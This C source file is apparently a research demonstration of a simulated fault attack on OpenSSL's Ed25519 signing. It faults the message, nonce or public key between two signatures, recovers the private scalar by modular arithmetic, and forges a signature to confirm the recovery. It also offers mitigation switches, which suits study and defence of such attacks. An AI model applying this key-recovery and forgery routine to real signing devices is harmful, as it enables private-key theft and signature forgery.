#include <stdio.h>
#include <stdint.h>
#include <argp.h>
#include <gmp.h>
#include <string.h>

#include "openssl/conf.h"
#include "openssl/evp.h"
#include "openssl/err.h"
#include "openssl/sha.h"
#include "openssl/rand.h"

#include "pretty_print.h"
#include "flags.h"


#define SIGN_RUNS 2

#define ARGFLAG_FAULT		'F'
#define ARGFLAG_MIT_RAND 	0x80
#define ARGFLAG_MIT_CHECK 	0x81
#define ARGFLAG_VERBOSE		'v'
#define ARGFLAG_NO_COLOR	'p'
#define ARGFLAG_SILENT		's'

// Globals
int fault_param = FLAGS_FAULT_PARAM_M;
int mitigations = 0;

// Configure argp
const char *argp_program_version = "ossl-ed25519-attack 1.0.2";
static char doc[] = "A simulated fault attack on OpenSSL Ed25519";
static struct argp_option options[] = {
	{0,0,0,0, "Faults:"},
	{"fault", ARGFLAG_FAULT, "FAULT", OPTION_ARG_OPTIONAL, "Choose what parameter(s) to fault:\n\"M\", \"R\", \"A\", \"none\"\n(not specifying -F is equivalent to \"-FM\")" },

	{0,0,0,0, "Mitigations:"},
	{"mit-rand", ARGFLAG_MIT_RAND, 0, 0, "Add randomness to nonce"},
	{"mit-check", ARGFLAG_MIT_CHECK, 0, 0, "Check integrity of parameters during signature generation"},

	{0,0,0,0, "Output:"},
	{"verbose", ARGFLAG_VERBOSE, 0, 0, "Produce verbose output"},
	{"no-color", ARGFLAG_NO_COLOR, 0, 0, "Produce plain output without colors"},
	{"silent", ARGFLAG_SILENT, 0, 0, "Produce no output at all"},
	{0}
};
static int parse_opt (int key, char *arg, struct argp_state *state);
static struct argp argp = {options, parse_opt, 0, doc};

static uint8_t kmsg[] 					= {1, 2, 3, 4};
static const uint8_t kmsg_original[] 	= {1, 2, 3, 4};
static const uint8_t test_msg[] 		= "JMP ESP";
uint8_t sig[SIGN_RUNS][64];

// Function declarations
int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len);
int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t fR, const mpz_t s, const mpz_t fs);
int verify_ossl(const uint8_t sig[64], const uint8_t public_key[32], const uint8_t *m, const int m_len);

// Ed25519 function imports from openssl/crypto/ec/curve25519.c (patched)
typedef int32_t fe[10];
typedef struct {
	fe X;
	fe Y;
	fe Z;
	fe T;
} ge_p3;
extern void ge_scalarmult_base(ge_p3 *h, const uint8_t *a);
extern void ge_p3_tobytes(uint8_t *s, const ge_p3 *h);

// Parse a single option (argp)
static int parse_opt (int key, char *arg, struct argp_state *state)
{	
	switch (key)
	{
	case ARGFLAG_MIT_RAND:
		mitigations |= FLAGS_MIT_RAND;
		break;
	case ARGFLAG_MIT_CHECK:
		mitigations |= FLAGS_MIT_CHECK;
		break;
	case ARGFLAG_VERBOSE:
		pp_verbose = 1;
		break;
	case ARGFLAG_NO_COLOR:
		pp_color = 0;
		break;
	case ARGFLAG_SILENT:
		pp_silent = 1;
		break;
	case ARGFLAG_FAULT: {
		if (arg == NULL)
			return ARGP_ERR_UNKNOWN;
		fault_param = FLAGS_FAULT_PARAM_NONE;
		if (strcmp(arg, "none") == 0)
			return 0;
		int len = strlen(arg);
		for (int i = 0; i < len; i++) {
			switch (arg[i])
			{
			case 'R':
				fault_param |= FLAGS_FAULT_PARAM_R;
				break;
			case 'A':
				fault_param |= FLAGS_FAULT_PARAM_A;
				break;
			case 'M':
				fault_param |= FLAGS_FAULT_PARAM_M;
				break;
			
			default:
				return ARGP_ERR_UNKNOWN;
			}
		}
		break;
	}
	
	default:
		return ARGP_ERR_UNKNOWN;
	}

	return 0;
}


int recover_a(mpz_t a, const mpz_t A, const mpz_t fA, const mpz_t R, const mpz_t fR, const mpz_t s, const mpz_t fs)
{
	// Configure pretty print
	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:recover_a()}");
	pretty_print_text("Recover secret a:");

	pretty_print_v_mpz("R  =", R);
	if (mpz_cmp(R, fR) != 0)
		pretty_print_v_mpz("fR =", fR);
	pretty_print_v_mpz("A  =", A);
	if (mpz_cmp(A, fA) != 0)
		pretty_print_v_mpz("fA =", fA);
	pretty_print_v_mpz("s  =", s);
	if (mpz_cmp(s, fs) != 0)
		pretty_print_v_mpz("fs =", fs);

	mpz_t h, fh, nr, nR, tmp, l;
	mpz_inits(h, fh, nr, nR, tmp, l, NULL);

	// Compute hashes h, fh
	if (!sha512(h, R, A, kmsg_original, sizeof(kmsg_original))
		|| !sha512(fh, fR, fA, kmsg, sizeof(kmsg))) {
		pretty_print_text_col("Error computing hashes!", PP_COL_RED);
		goto err;
	}
	
	// l = 2^252 + 27742317777372353535851937790883648493 (see Ed25519)
	mpz_set_str(tmp, "27742317777372353535851937790883648493", 10);
	mpz_ui_pow_ui(l, 2, 252);
	mpz_add(l, l, tmp);
	
	mpz_mod(h, h, l);
	mpz_mod(fh, fh, l);

	pretty_print_v_mpz("l          =", l);
	pretty_print_v_mpz("h (mod l)  =", h);
	pretty_print_v_mpz("fh (mod l) =", fh);

	// recover secret a = (s - fs) / (h - fh)
	//                  = (s - fs) * (h - fh)^-1
	mpz_sub(h, h, fh);
	mpz_mod(h, h, l);
	if (!mpz_invert(h, h, l)) {
		pretty_print_text_col("There is no modular inverse of h = (h - fh)!", PP_COL_RED);
		goto err;
	}
	mpz_sub(tmp, s, fs);
	mpz_mod(tmp, tmp, l);
	mpz_mul(a, tmp, h);
	mpz_mod(a, a, l);

	pretty_print_v_mpz("a =", a);

	// Recreate signature to check if a is correct
	pretty_print_v_text("Checking a:");
	// Choose random r and generate R accordingly
	uint8_t a_r[64], a_R[32];
	RAND_bytes(a_r, sizeof(a_r));
	mpz_import(nr, sizeof(a_r), -1, sizeof(uint8_t), 0, 0, a_r);
	mpz_mod(nr, nr, l);
	pretty_print_v_mpz("New r =", nr);

	// Calculate R = rB
	memset(a_r, 0, sizeof(a_r));
	mpz_export(a_r, NULL, -1, sizeof(uint8_t), 0, 0, nr);
	{
		// Use functions from openssl/crypto/ec/curve25519.c
		ge_p3 ge_R;
		ge_scalarmult_base(&ge_R, a_r);
		ge_p3_tobytes(a_R, &ge_R);
	}
	mpz_import(nR, sizeof(a_R), -1, sizeof(uint8_t), 0, 0, a_R);
	pretty_print_v_mpz("New R =", nR);

	// h = H(nR, A, test_msg)
	if (!sha512(h, nR, A, test_msg, sizeof(test_msg))) {
		pretty_print_text_col("Error computing new hash!", PP_COL_RED);
		goto err;
	}

	// s = (nr + h*a) mod l
	mpz_mul(h, h, a);
	mpz_mod(h, h, l);
	mpz_add(tmp, nr, h);
	mpz_mod(tmp, tmp, l);
	pretty_print_v_mpz("s =", tmp);

	// Verify newly generated signature
	int ret;
	uint8_t sig_forged[64];
	uint8_t a_A[32];
	memset(sig_forged, 0, sizeof(sig_forged));
	memset(a_A, 0, sizeof(a_A));
	mpz_export(sig_forged, NULL, -1, sizeof(uint8_t), 0, 0, nR);
	mpz_export(sig_forged + 32, NULL, -1, sizeof(uint8_t), 0, 0, tmp);
	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);

	// Print forged signature
	pretty_print("Forged signature (R,s) =", sig_forged, sizeof(sig_forged));
	pretty_print("    R =", sig_forged, sizeof(sig_forged)/2);
	pretty_print("    s =", sig_forged + sizeof(sig_forged)/2, sizeof(sig_forged)/2);

	ret = verify_ossl(sig_forged, a_A, test_msg, sizeof(test_msg));
	if (ret == 1)
		pretty_print_text_col("Signature successfully forged.", PP_COL_GREEN);
	else if (ret == 0)
		pretty_print_text_col("Signature could not be forged.", PP_COL_RED);
	else
		goto err;

	mpz_clears(h, fh, nr, nR, tmp, l, NULL);
	pretty_print_cfg_rm();
	return 1;

err:
	mpz_clears(h, fh, nr, nR, tmp, l, NULL);
	ERR_print_errors_fp(stderr);
	pretty_print_cfg_rm();
	return 0;
}

int verify_ossl(const uint8_t sig[64], const uint8_t public_key[32], const uint8_t *m, const int m_len)
{
	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:verify_ossl()}");

	int ret;
	EVP_PKEY *pkey = NULL;
	EVP_PKEY_CTX *pctx = NULL;
	EVP_MD_CTX  *mdctx = NULL;

	pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
	pkey = EVP_PKEY_new_raw_public_key(EVP_PKEY_ED25519, NULL, public_key, 32);

	mdctx = EVP_MD_CTX_new();

	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestVerifyInit.html
	if (!EVP_DigestVerifyInit(mdctx, &pctx, NULL, NULL, pkey))
		goto err;
	ret = EVP_DigestVerify(mdctx, sig, 64, m, m_len);

err:
	EVP_MD_CTX_free(mdctx);
	pretty_print_cfg_rm();
	return ret;
}

/**
 * h = SHA512(R, A, m)
 */
int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len) 
{
	// Configure pretty print
	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:sha512()}");
	pretty_print_v_text("Computing SHA512");
	
	uint8_t a_R[32], a_A[32];

	memset(a_R, 0, sizeof(a_R));
	memset(a_A, 0, sizeof(a_A));
	mpz_export(a_R, NULL, -1, sizeof(uint8_t), 0, 0, R);
	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);

	// OpenSSL SHA512
	uint8_t a_h[SHA512_DIGEST_LENGTH];
	EVP_MD_CTX *hash_ctx;
	unsigned int h_len;

	if ((hash_ctx = EVP_MD_CTX_new()) == NULL)
		goto err;

	// Compute hash
	if (!EVP_DigestInit_ex(hash_ctx, EVP_sha512(), NULL)
		|| !EVP_DigestUpdate(hash_ctx, a_R, sizeof(a_R))
		|| !EVP_DigestUpdate(hash_ctx, a_A, sizeof(a_A))
		|| !EVP_DigestUpdate(hash_ctx, m, m_len)
		|| !EVP_DigestFinal_ex(hash_ctx, a_h, &h_len))
		goto err;

	mpz_import(h, h_len, -1, sizeof(uint8_t), 0, 0, a_h);

	EVP_MD_CTX_free(hash_ctx);
	pretty_print_cfg_rm();
	return 1;

err:
	ERR_print_errors_fp(stderr);
	pretty_print_cfg_rm();
	return 0;
}

int main(int arc, char *argv[])
{
	// Parse arguments
	pp_verbose = 0;
	pp_color = 1;
	argp_parse(&argp, arc, argv, 0, 0, 0);

	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:main()}");
	int ret;

	// Initialize the one and only crypto lib
	OPENSSL_init_crypto(0, NULL);
	OpenSSL_add_all_algorithms();

	// Load the human readable error strings for libcrypto
	ERR_load_crypto_strings();

	EVP_PKEY *pkey = NULL;
	EVP_PKEY *pkey_backup = NULL;
	EVP_PKEY_CTX *pctx = NULL;
	EVP_MD_CTX  *mdctx = NULL;
	size_t sig_len = sizeof(sig[0]);

	uint8_t pub[32];
	size_t pub_len = sizeof(pub);
	
	// Generate keys
	// Doc: https://www.openssl.org/docs/man1.1.1/man7/Ed25519.html
	pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
	if (!EVP_PKEY_keygen_init(pctx) ||
		!EVP_PKEY_keygen(pctx, &pkey))
		goto err;

	// Backup public key because it may be faulted
	EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);

	// Print public key
	pretty_print("Raw public key:", pub, pub_len);

	// Sign message
	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestSignInit.html
	mdctx = EVP_MD_CTX_new();
	if (!EVP_DigestSignInit(mdctx, &pctx, NULL, NULL, pkey))
		goto err;
	for (int sign_run = 0; sign_run < SIGN_RUNS; sign_run++) {
		// Reset kmsg
		memcpy(kmsg, kmsg_original, sizeof(kmsg_original));

		// One-shot-sign (update and final are not supported with Ed25519)
		pretty_print_v_text("Start Ed25519 sign");
		if (!EVP_DigestSign(mdctx, sig[sign_run], &sig_len, kmsg, sizeof(kmsg)))
			goto err;
		pretty_print_v_text("End Ed25519 sign");

		// Print signature
		pretty_print("Signature (R,s) =", sig[sign_run], sig_len);
		pretty_print("    R =", sig[sign_run], sig_len/2);
		pretty_print("    s =", sig[sign_run] + sig_len/2, sig_len/2);

		// Check signature
		ret = verify_ossl(sig[sign_run], pub, kmsg_original, sizeof(kmsg_original));
		if (ret == 1)
			pretty_print_text_col("Signature successfully verified.", PP_COL_GREEN);
		else if (ret == 0)
			pretty_print_text_col("Signature could not be verified.", PP_COL_RED);
		else
			goto err;
	}

	// Calculate secret a
	if (ret == 0 && SIGN_RUNS >= 2) {

		mpz_t A, R, fA, fR, s, fs, a;
		mpz_inits(A, R, fA, fR, s, fs, a, NULL);
		mpz_import(A, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
		EVP_PKEY_get_raw_public_key(pkey, pub, &pub_len);
		mpz_import(fA, pub_len, -1, sizeof(pub[0]), 0, 0, pub);
		mpz_import(R, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0]);
		mpz_import(fR, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1]);
		mpz_import(s, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[0] + 32);
		mpz_import(fs, sig_len / 2, -1, sizeof(sig[0][0]), 0, 0, sig[1] + 32);

		recover_a(a, A, fA, R, fR, s, fs);
		pretty_print_mpz("a =", a);

		mpz_clears(A, R, fA, fR, s, fs, a, NULL);
	}
	
	// Free stuff
	EVP_MD_CTX_free(mdctx);
	//EVP_PKEY_CTX_free(pctx); <- pctx became part of mdctx which is freed already

	// Removes all digests and ciphers
	EVP_cleanup();

	// if you omit the next, a small leak may be left when you make use of the BIO (low level API) for e.g. base64 transformations
	CRYPTO_cleanup_all_ex_data();

	// Remove error strings
	ERR_free_strings();

	pretty_print_cfg_rm();
	return 0;

err:
	ERR_print_errors_fp(stderr);
	pretty_print_cfg_rm();
	return 0;
}